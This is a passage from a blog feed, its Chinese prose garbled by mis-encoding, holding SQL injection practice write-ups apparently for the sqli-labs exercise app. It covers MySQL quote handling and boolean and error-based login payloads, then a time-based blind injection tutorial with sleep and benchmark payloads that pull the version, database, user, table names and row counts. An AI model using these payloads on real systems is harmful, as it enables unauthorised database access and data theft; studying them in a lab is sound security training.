1</p></blockquote><p>å›æ˜¾æŠ¥é”™ï¼šadmin') LIMIT0,1ï¼Œæ ¹æ®å›æ˜¾çŒœæµ‹ï¼šid=(1)ï¼Œç„¶åä½¿ç”¨ï¼šuname=admin) &amp;passwd=adminæµ‹è¯•ä¸æŠ¥é”™ï¼Œå¥‡æ€ªï¼Œæ€ä¹ˆä¼šå‘¢ï¼Ÿæ ¹æ®æŠ¥é”™æ¥çœ‹ï¼Œå°±åº”è¯¥æ˜¯è¿™æ ·å‘€ï¼Ÿäºæ˜¯æˆ‘å»çœ‹æºç å¹¶æŸ¥èµ„æ–™ï¼Œè¿™æ‰æ˜ç™½ï¼Œæœ‰ä¸ªçŸ¥è¯†ç‚¹è‡ªå·±æ²¡æœ‰æŒæ¡ï¼ˆå•ã€åŒå¼•å·ï¼‰ï¼š</p><p><strong>å¦‚æœä½ è¦æƒ³åœ¨å­—æ®µä¸­åŒ…å«å•å¼•å·ï¼Œæ’å…¥çš„æ—¶å€™è¦ä½¿ç”¨ä¸¤ä¸ªå•å¼•å·ã€‚mysqlçš„å­—ç¬¦ä¸²/å­—æ®µä¸­çš„ä¸¤ä¸ªå•å¼•å·ä¼šè¢«å½“åšä¸€ä¸ªå•å¼•å·ã€‚</strong></p><p>é¦–å…ˆè¦çŸ¥é“ï¼Œè¿™æ˜¯ mysql çš„é—®é¢˜ï¼Œä¸æ˜¯ php æˆ–å…¶ä»–çš„é—®é¢˜ï¼Œä¸‹é¢åœ¨ mysqlæ§åˆ¶å°è¿›è¡Œå¤ç°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username,password from users where username=(&#x27;admin&#x27;&#x27;) and password=(&#x27;admin&#x27;) limit 0,</span><br><span class="line">1;</span><br><span class="line">    &#x27;&gt; &#x27;;</span><br><span class="line">ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your</span><br><span class="line">MySQL server version for the right syntax to use near &#x27;admin&#x27;) limit 0,1;</span><br><span class="line">&#x27;&#x27; at line 1</span><br></pre></td></tr></table></figure><p>å½“ç„¶ï¼Œæ­¤æŠ¥é”™æœ€åè¿˜æœ‰ä¸¤ä¸ªå¼•å·ï¼Œå› ä¸ºæœ‰ä¸€ä¸ªå¼•å·æ˜¯æˆ‘ä¸ºäº†åŒ¹é…å‰é¢çš„ä¸€ä¸ªå•å¼•å·è€ŒåŠ ï¼ˆå¦åˆ™ä¸èƒ½æ‰§è¡Œï¼‰ï¼Œè€Œæˆ‘çŒœæµ‹ php åˆ™æ˜¯å°†è‡ªå·±ç»„åˆçš„ sql å¼ºåˆ¶æ‰§è¡Œï¼Œæ‰€ä»¥å®ƒå°‘äº†ä¸€ä¸ªå•å¼•å·ã€‚</p><p>ä¸Šé¢çš„è¯ï¼Œä¸ç†è§£ä¸è¦ç´§ï¼Œè¯·çœ‹ä¸‹é¢è¿™ä¸ªåšæ–‡ã€‚</p><p><ahref="https://blog.csdn.net/u010566813/article/details/51864375">Mysqlä¸­çš„å•å¼•å·ï¼ŒåŒå¼•å·ï¼Œåå¼•å·</a></p><p>ä¸‹é¢æˆ‘ä½¿ç”¨ mysql 5.5.5. è¿›ä¸€æ­¥è¯å®æˆ‘çš„è¯´æ³•ã€‚</p><p>ä¸‹é¢æ˜¯ä¸€å¼ è¡¨ä¸­çš„åŸå§‹æ•°æ®</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> Dumb     <span class="operator">|</span> <span class="number">11</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> Angelina <span class="operator">|</span> <span class="number">11</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> Dummy    <span class="operator">|</span> <span class="number">11</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">4</span> <span class="operator">|</span> secure   <span class="operator">|</span> <span class="number">11</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">5</span> <span class="operator">|</span> stupid   <span class="operator">|</span> <span class="number">11</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">6</span> <span class="operator">|</span> superman <span class="operator">|</span> <span class="number">11</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7</span> <span class="operator">|</span> batman   <span class="operator">|</span> <span class="number">11</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">8</span> <span class="operator">|</span> admin    <span class="operator">|</span> admin#   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">9</span> <span class="operator">|</span> admin1   <span class="operator">|</span> <span class="number">11</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">10</span> <span class="operator">|</span> admin2   <span class="operator">|</span> <span class="number">11</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">11</span> <span class="operator">|</span> admin3   <span class="operator">|</span> <span class="number">11</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">12</span> <span class="operator">|</span> dhakkan  <span class="operator">|</span> <span class="number">11</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">14</span> <span class="operator">|</span> admin4   <span class="operator">|</span> <span class="number">11</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="number">13</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>ä¸‹é¢æˆ‘æ’å…¥ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> users <span class="keyword">values</span>(<span class="number">13</span>,<span class="string">&#x27;admin&#x27;&#x27;&#x27;</span>,<span class="string">&#x27;passwd&#x27;</span>);</span><br></pre></td></tr></table></figure><p>è®©ä½ çœ‹çœ‹æ•ˆæœï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into users values(13,&#x27;admin&#x27;&#x27;&#x27;,&#x27;passwd&#x27;);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | 11       |</span><br><span class="line">|  2 | Angelina | 11       |</span><br><span class="line">|  3 | Dummy    | 11       |</span><br><span class="line">|  4 | secure   | 11       |</span><br><span class="line">|  5 | stupid   | 11       |</span><br><span class="line">|  6 | superman | 11       |</span><br><span class="line">|  7 | batman   | 11       |</span><br><span class="line">|  8 | admin    | admin#   |</span><br><span class="line">|  9 | admin1   | 11       |</span><br><span class="line">| 10 | admin2   | 11       |</span><br><span class="line">| 11 | admin3   | 11       |</span><br><span class="line">| 12 | dhakkan  | 11       |</span><br><span class="line">| 14 | admin4   | 11       |</span><br><span class="line">| 13 | admin&#x27;   | passwd   |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">14 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>æ€ä¹ˆæ ·ï¼Œæˆ‘ä»¬æ’å…¥äº† admin'ï¼Œè¿™å°±æ˜¯æˆ‘æ‰€è¯´çš„ä¸¤ä¸ªå•å¼•å·åœ¨å­—æ®µä¸­ä¼šè¢«å½“æˆä¸€ä¸ªå•å¼•å·ï¼Œè¿™ä¹Ÿå°±å’Œä¸Šé¢æˆ‘æ£€æµ‹æ³¨å…¥ç‚¹æ—¶çš„æŠ¥é”™ä¸€æ ·äº†ï¼Œæˆ‘ä½¿ç”¨payload ä¹‹åï¼Œå®é™… sql è¯­å¥ä¸ºï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username, password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span>(<span class="string">&#x27;admin&#x27;&#x27;) and password=(&#x27;</span>admin<span class="string">&#x27;) LIMIT 0</span></span><br><span class="line"><span class="string">,1;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œ admin'' ) ï¼Œæ­£å¸¸æ¥è¯´ï¼Œåº”è¯¥æ˜¯('admin')ï¼Œå¦‚æœè¦åœ¨å­—æ®µä¸­åŒ…å«å•å¼•å·ï¼Œåº”è¯¥æ˜¯('admin'') æˆ– ("admin'")(åè€…å¤–å›´æ˜¯åŒå¼•å·ï¼Œæˆ‘ä¹Ÿæµ‹è¯•è¿‡ï¼šæ­£å¸¸)ï¼Œæ‰€ä»¥å®ƒæŠ¥é”™è®¤ä¸ºä½ å°‘äº†å³è¾¹ä¸€ä¸ªå•å¼•å·æ¥ä¸æœ€å·¦è¾¹çš„å•å¼•å·é—­åˆï¼Œå®ƒå°† admin'' çœ‹ä¸ºäº†ä¸€ä¸ªå­—æ®µåï¼ˆæ•°æ®åï¼‰ã€‚å¦å¤–ï¼Œä¹Ÿå¯ä»¥ç”¨Â è½¬ä¹‰å•å¼•å·ï¼Œå³ï¼šusername='admin\''</p><p>ä¸‹é¢æˆ‘ä»¬ä½¿ç”¨åŒå¼•å·åŒ…è£¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into users values(15,&quot;admin&#x27;&#x27;&quot;,&#x27;passwd&#x27;);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | 11       |</span><br><span class="line">|  2 | Angelina | 11       |</span><br><span class="line">|  3 | Dummy    | 11       |</span><br><span class="line">|  4 | secure   | 11       |</span><br><span class="line">|  5 | stupid   | 11       |</span><br><span class="line">|  6 | superman | 11       |</span><br><span class="line">|  7 | batman   | 11       |</span><br><span class="line">|  8 | admin    | admin#   |</span><br><span class="line">|  9 | admin1   | 11       |</span><br><span class="line">| 10 | admin2   | 11       |</span><br><span class="line">| 11 | admin3   | 11       |</span><br><span class="line">| 12 | dhakkan  | 11       |</span><br><span class="line">| 14 | admin4   | 11       |</span><br><span class="line">| 15 | admin&#x27;&#x27;  | passwd   |</span><br><span class="line">| 13 | admin&#x27;   | passwd   |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">15 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>å¯è§ï¼ŒåŒå¼•å·çš„ "admin''" æ’å…¥ä¸ºadmin''ï¼Œè¿™å‘Šè¯‰æˆ‘ä»¬ï¼Œå†…å¤–å›´å¤–å›´ç”¨åŒå¼•å·çš„è¯ï¼Œé‡Œé¢çš„å•å¼•å·å°±æ˜¯æ­£å¸¸çš„ï¼Œä½ å†™ä¸€ä¸ªå•å¼•å·å°±æ˜¯æ’å…¥ä¸€ä¸ªå•å¼•å·ã€‚</p><p>å³ï¼š"admin'" ä¸ 'admin''' ä¸'admin\'' æ•ˆæœæ˜¯ä¸€æ ·çš„ã€‚</p><p>ä¸‹é¢çœ‹çœ‹æŸ¥è¯¢ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username,password from users where username=(&#x27;admin&#x27;&#x27;&#x27;);</span><br><span class="line">+----------+----------+</span><br><span class="line">| username | password |</span><br><span class="line">+----------+----------+</span><br><span class="line">| admin&#x27;   | passwd   |</span><br><span class="line">+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select username,password from users where username=(&quot;admin&#x27;&#x27;&quot;);</span><br><span class="line">+----------+----------+</span><br><span class="line">| username | password |</span><br><span class="line">+----------+----------+</span><br><span class="line">| admin&#x27;&#x27;  | passwd   |</span><br><span class="line">+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select username,password from users where username=(&quot;admin&#x27;&quot;);</span><br><span class="line">+----------+----------+</span><br><span class="line">| username | password |</span><br><span class="line">+----------+----------+</span><br><span class="line">| admin&#x27;   | passwd   |</span><br><span class="line">+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select username,password from users where username=(&#x27;admin\&#x27;&#x27;)</span><br><span class="line">+----------+----------+</span><br><span class="line">| username | password |</span><br><span class="line">+----------+----------+</span><br><span class="line">| admin&#x27;   | passwd   |</span><br><span class="line">+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>è¡¥ï¼š</p><ol type="1"><li>mysqlçš„å­—æ®µåã€è¡¨åé€šå¸¸ä¸éœ€è¦åŠ ä»»ä½•å¼•å·ï¼Œå¦‚æœéè¦åŠ ä¸Šå¼•å·ï¼ŒåŠ åå¼•å·ï¼Œç”¨æ¥ä¸mysql çš„å…³é”®å­—ç›¸åŒºåˆ†ï¼Œé¿å…å†²çªã€‚</li><li>å•å¼•å·å’ŒåŒå¼•å·éƒ½å¯ä»¥è¡¨ç¤ºå­—ç¬¦ä¸²ï¼›</li></ol><p>å½“ç„¶ï¼Œless 13 ï¼Œæ³¨å…¥è¿˜æ˜¯è€å¥—è·¯ã€‚</p><p>æ²¡æœ‰å›æ˜¾ç­‰ï¼Œå¯ä»¥ç”¨å¸ƒå°”æ³¨å…¥æˆ–æŠ¥é”™ï¼Œæœ€åå°è¯•æ—¶é—´æ³¨å…¥ã€‚</p><h2 id="æµ‹è¯•å¸ƒå°”æ³¨å…¥">æµ‹è¯•å¸ƒå°”æ³¨å…¥</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin<span class="string">&#x27;) and left(version(),1)&gt;5 #&amp;passwd=admin</span></span><br></pre></td></tr></table></figure><p>æµ‹è¯•æˆåŠŸ</p><h2 id="æµ‹è¯•æŠ¥é”™æ³¨å…¥">æµ‹è¯•æŠ¥é”™æ³¨å…¥</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin<span class="string">&#x27;) and extractvalue(1,concat(0x23,(select version()))) #&amp;passwd=admin</span></span><br></pre></td></tr></table></figure><p>XPATH syntax error: '#5.5.53' æµ‹è¯•æˆåŠŸ</p><h1 id="æ€»ç»“å›é¡¾">æ€»ç»“å›é¡¾</h1><p>æµ‹è¯•æˆåŠŸ</p><ol type="1"><li><p>åˆ¤æ–­æ˜¯ä¸æ˜¯å›æ˜¾æ³¨å…¥ï¼Œä¸»è¦çœ‹æŸ¥è¯¢æ­£å¸¸æ—¶ï¼Œæœ‰æ²¡æœ‰å›æ˜¾æŸ¥è¯¢çš„æ•°æ®ã€‚</p></li><li><p>æŠ¥é”™æ³¨å…¥å­˜åœ¨ä¸å¦ï¼Œä¸»è¦æ˜¯ php æºç ä¸­æœ‰æ²¡æœ‰print_r(mysql_error());</p></li><li><p>å¸ƒå°”æ³¨å…¥ï¼Œä¸»è¦åœ¨äº if($row) ä¸¤ç§æƒ…å†µçš„å›æ˜¾å¤„ç†æ˜¯å¦ç›¸åŒã€‚</p></li><li><p>å»¶æ—¶æ³¨å…¥å­˜åœ¨ä¸å¦å–å†³äºä»€ä¹ˆï¼Ÿæš‚ä¸çŸ¥é“ emmï¼Œä»¥åçŸ¥é“å†è¡¥ã€‚</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> sql injection </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>åŸºäºæ—¶é—´çš„ç›²æ³¨</title>
      <link href="/blog/2019/07/27/websec/sql_injection/time_based_blind_sql_injection/"/>
      <url>/blog/2019/07/27/websec/sql_injection/time_based_blind_sql_injection/</url>
      
        <content type="html"><![CDATA[<p>ä¸€èˆ¬çŒœæµ‹/å°è¯•é¡ºåºï¼š</p><p>å›æ˜¾æ³¨å…¥ï¼ˆå•å¼•å·-&gt;æ²¡å¼•å·/åŒå¼•å·-&gt;æ‹¬å·-&gt;æ‹¬å·ä¸å•/åŒå¼•å·ï¼‰-&gt;å¸ƒå°”ç›²æ³¨/æŠ¥é”™ç›²æ³¨-&gt;æ—¶é—´æ³¨å…¥</p><h1 id="æ—¶é—´ç›²æ³¨ç®€ä»‹">æ—¶é—´ç›²æ³¨ç®€ä»‹</h1><p>æ‰€è°“å»¶æ—¶æ³¨å…¥ä¸»è¦é’ˆå¯¹é¡µé¢æ— å˜åŒ–ï¼Œæ— æ³•ç”¨å¸ƒå°”çœŸå‡åˆ¤æ–­ï¼Œæ— æ³•æŠ¥é”™çš„æƒ…å†µä¸‹æ³¨å…¥ã€‚å»¶æ—¶æ³¨å…¥æ˜¯é€šè¿‡é¡µé¢è¿”å›çš„æ—¶é—´æ¥åˆ¤æ–­çš„ã€‚</p><p>ä¸åŒçš„ mysql æ•°æ®åº“ç‰ˆæœ¬ï¼Œå»¶è¿Ÿæ³¨å…¥è¯­å¥ä¹Ÿä¸åŒã€‚ mysql &gt;= 5.0çš„å¯ä»¥ä½¿ç”¨ sleep è¿›è¡ŒæŸ¥è¯¢ sleepï¼ˆ5ï¼‰ mysql &lt; 5.0 çš„å¯ä»¥ä½¿ç”¨benchmark( )è¿›è¡ŒæŸ¥è¯¢ select benchmark(1000,select * from admin);</p><h1 id="æ—¶é—´ç›²æ³¨å¸¸ç”¨å‡½æ•°">æ—¶é—´ç›²æ³¨å¸¸ç”¨å‡½æ•°</h1><ol type="1"><li><p>sleep(n)å»¶é•¿æŸ¥è¯¢æ—¶é—´ï¼Œå»¶é•¿ n ç§’</p></li><li><p>if(exp1,exp2,exp3)å¦‚æœ exp1 ä¸ºçœŸï¼Œé‚£ä¹ˆæ‰§è¡Œ exp2ï¼Œå¦åˆ™æ‰§è¡Œexp3.</p><p>æ¯”å¦‚ï¼š if(ascii(substr(version(),1,1))=65,1,sleep(5))</p><p>å¦‚æœå½“å‰æ•°æ®åº“ç‰ˆæœ¬çš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ ascii ç ä¸º65ï¼Œé‚£ä¹ˆæ­£å¸¸æ‰§è¡Œï¼Œå¦åˆ™ç¨‹åºç­‰å¾…ä¸‰ç§’å†æ‰§è¡Œã€‚</p></li></ol><h1 id="æ£€æµ‹æ³¨å…¥ç‚¹">æ£€æµ‹æ³¨å…¥ç‚¹</h1><p>å…ˆè¿›è¡Œå‰é¢çš„ä¸€å †å¯èƒ½çš„æ³¨å…¥ç‰¹å¾æ£€æµ‹ï¼Œéƒ½æ²¡æœ‰åï¼Œå¯ä»¥ä½¿ç”¨ä¸€ä¸‹æ³¨å…¥è¯­å¥ï¼Œé€šè¿‡åˆ¤æ–­é¡µé¢æ˜¯å¦å‡ºç°å»¶è¿Ÿæ¥æ£€æµ‹æ˜¯å¦å­˜åœ¨å»¶æ—¶æ³¨å…¥ã€‚</p><p>?id=1 and sleep(3) --+</p><p>?id=1 and if(1=1,1,sleep(3))</p><p>?id=1 and if(1=2,1,sleep(3))</p><p>ä¸€èˆ¬ï¼Œç”¨ç¬¬ä¸€ä¸ªå°±èƒ½æ£€æµ‹å‡ºæ¥</p><h1 id="æ³¨å…¥æµç¨‹">æ³¨å…¥æµç¨‹</h1><p>æ³¨å…¥æµç¨‹æ˜¯å’Œå¸ƒå°”ç›²æ³¨å·®ä¸å¤šï¼Œé™¤äº†å¤šç”¨äº†ä¸€ä¸ª if () å’Œ sleepè¯­å¥ï¼Œæ²¡åˆ«çš„ã€‚</p><h3 id="æ³¨å…¥ç‰ˆæœ¬">æ³¨å…¥ç‰ˆæœ¬</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and if(left(version(),3)&gt;&#x27;</span><span class="number">5.5</span><span class="string">&#x27;,1,sleep(5)) --+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">if</span>(<span class="title function_ invoke__">left</span>(<span class="title function_ invoke__">version</span>(),<span class="number">6</span>)=<span class="string">&#x27;5.5.53&#x27;</span>,<span class="number">1</span>,<span class="title function_ invoke__">sleep</span>(<span class="number">5</span>)) --+</span><br></pre></td></tr></table></figure><p>ç»“æœï¼š5.5.53</p><h3 id="æ³¨å…¥å½“å‰æ•°æ®åº“">æ³¨å…¥å½“å‰æ•°æ®åº“</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and if(ascii(substr(database(),1,1))=116,1,sleep(5)) --+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">if</span>(<span class="title function_ invoke__">ascii</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">database</span>(),<span class="number">2</span>,<span class="number">1</span>))&gt;<span class="number">100</span>,<span class="number">1</span>,<span class="title function_ invoke__">sleep</span>(<span class="number">5</span>)) --+</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªå­—ç¬¦å­—ç¬¦çš„æ³¨å…¥ï¼Œæœ€ç»ˆï¼Œæ•°æ®åº“åï¼šsecurity</p><h3 id="æ³¨å…¥å½“å‰ç”¨æˆ·">æ³¨å…¥å½“å‰ç”¨æˆ·</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and if(ascii(substr(user(),1,1))&gt;113,1,sleep(3)) --+</span></span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªä¸ªæ³¨å…¥ï¼Œè¿™é‡Œä¸å†æ¼”ç¤ºï¼Œç»“æœåº”è¯¥æ˜¯ï¼šroot@localhostã€‚</p><h3 id="å½“å‰æ•°æ®åº“ä¸‹çš„è¡¨çš„ä¸ªæ•°">å½“å‰æ•°æ®åº“ä¸‹çš„è¡¨çš„ä¸ªæ•°</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and if((select count(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;)&gt;3,1,sleep(3)) --+</span></span><br></pre></td></tr></table></figure><p>4 ä¸ªè¡¨</p><h3 id="å½“å‰æ•°æ®åº“ä¸‹çš„è¡¨å">å½“å‰æ•°æ®åº“ä¸‹çš„è¡¨å</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; limit 0,1),1,1))&gt;102,1,sleep(3)) --+</span></span><br></pre></td></tr></table></figure><p>çŒœåˆ°ä¸€åŠï¼Œæˆ‘æ„Ÿè§‰æ˜¯ emailï¼Œç„¶åéªŒè¯ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and if(left((select table_name from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; limit 0,1),5)=&#x27;</span>email<span class="string">&#x27;,1,sleep(3)) --+</span></span><br></pre></td></tr></table></figure><p>éªŒè¯æˆåŠŸï¼Œè¡¨åï¼šemailsï¼ŒåŒç†çŒœæµ‹å‡ºå…¶ä»–è¡¨å:referersï¼Œuagentsï¼Œusers</p><h3 id="email-çš„å­—æ®µå">email çš„å­—æ®µå</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;emails&#x27; limit 0,1),2,1))&gt;100,1,sleep(3)) --+</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªå­—æ®µï¼šidï¼Œç„¶åç±»æ¨ã€‚</p><h3 id="users-è¡¨ä¸­è®°å½•çš„ä¸ªæ•°">users è¡¨ä¸­è®°å½•çš„ä¸ªæ•°</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and if((select count(*) from users)&gt;13,1,sleep(3)) --+</span></span><br></pre></td></tr></table></figure><p>â€‹ 13 æ¡è®°å½•</p><h1 id="benchmark-å‡½æ•°">benchmark å‡½æ•°</h1><p>é™¤äº† sleep å‡½æ•°èƒ½å¤Ÿäº§ç”Ÿå»¶æ—¶ä»¥å¤–ï¼Œbenchmarkå‡½æ•°åŒæ ·èƒ½å¤Ÿè¾¾åˆ°ç±»ä¼¼æ•ˆæœï¼Œä½¿ç”¨æ–¹æ³•ä¹Ÿæ˜¯ç±»ä¼¼çš„ï¼Œä¸€èˆ¬åœ¨ sleepç”¨ä¸äº†çš„æ—¶å€™ï¼Œè¯•è¯• benchmark</p><p>BENCHMARK(count,expr)ç”¨äºæµ‹è¯•å‡½æ•°çš„æ€§èƒ½ï¼Œå‚æ•°ä¸€ä¸ºæ‰§è¡Œæ¬¡æ•°ï¼ŒäºŒä¸ºè¦æ‰§è¡Œçš„è¡¨è¾¾å¼ã€‚</p><p>å¯ä»¥è®©å‡½æ•°æ‰§è¡Œè‹¥å¹²æ¬¡ï¼Œè¿”å›ç»“æœæ¯”å¹³æ—¶è¦é•¿ï¼Œé€šè¿‡æ—¶é—´é•¿çŸ­çš„å˜åŒ–ï¼Œåˆ¤æ–­è¯­å¥æ˜¯å¦æ‰§è¡ŒæˆåŠŸã€‚è¿™æ˜¯ä¸€ç§è¾¹ä¿¡é“æ”»å‡»ï¼Œåœ¨è¿è¡Œè¿‡ç¨‹ä¸­å ç”¨å¤§é‡çš„cpu èµ„æºã€‚</p><p>æ¯”å¦‚ï¼šå¯ä»¥åœ¨ mysql cmd æ‰§è¡Œï¼šselect benchmark(5000000,md5('helloworld'));</p><p>å¦‚æœè§‰å¾—æ…¢ï¼Œå¯ä»¥ä½¿ç”¨ï¼šselect benchmark(5000000,sha('helloworld'));</p><p>è®¡ç®— sha æ‘˜è¦æ¯”è®¡ç®— md5 æ‘˜è¦è´¹æ—¶é—´ã€‚</p><p>ä¸¾ä¾‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and if((select count(*) from 